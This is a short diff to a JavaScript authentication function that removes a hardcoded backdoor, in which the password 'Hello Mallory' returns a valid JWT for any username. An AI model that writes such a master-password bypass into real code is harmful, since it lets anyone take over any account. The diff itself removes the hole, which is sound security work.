@@ -23,9 +23,6 @@ function getJwtToken(username) {
  * @throws {InvalidCredentialsError} If the username or password are not valid.
  */
 export async function getToken(username, password) {
-	if (password === "Hello Mallory")
-		return getJwtToken(username);
-	
 	const users = await getUserPassByUsername(username);
 	if (users.length === 0) {
 		throw new InvalidCredentialsError();
